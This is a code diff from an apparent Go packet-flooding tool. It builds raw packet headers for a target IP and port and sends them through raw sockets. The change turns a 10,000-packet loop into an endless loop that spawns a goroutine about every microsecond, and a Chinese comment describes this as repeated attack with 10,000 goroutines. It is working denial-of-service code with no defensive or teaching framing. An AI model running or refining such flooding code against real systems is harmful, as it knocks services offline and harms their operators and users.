@@ -52,17 +52,23 @@ func main() {
 		log.Println("转换目标port错误：", err.Error())
 	}
 	targetPortUint16 = uint16(targetPortUint64)
-	for i := 0; i < 10000; i++ {
-		packetHeader = createPacketHeader(targetIp, targetPortUint16)
-		socketAddr = &syscall.SockaddrInet4{
-			Port: intPort,
-			Addr: ipSplitFourByte(targetIp),
-		}
-		if err = syscall.Sendto(fd, packetHeader, 0, socketAddr); err != nil {
-			log.Println("SendTo err:", err.Error())
-		}
+	// var wg sync.WaitGroup
+	//开启10000个协程反复攻击
+	for {
+		time.Sleep(1000 * time.Nanosecond)
+		// wg.Add(1)
+		go func() {
+			packetHeader = createPacketHeader(targetIp, targetPortUint16)
+			socketAddr = &syscall.SockaddrInet4{
+				Port: intPort,
+				Addr: ipSplitFourByte(targetIp),
+			}
+			if err = syscall.Sendto(fd, packetHeader, 0, socketAddr); err != nil {
+				log.Println("SendTo err:", err.Error())
+			}
+			// wg.Done()
+		}()
 	}
-	time.Sleep(3600 * 24 * 3 * time.Second)
 }
 
 /*
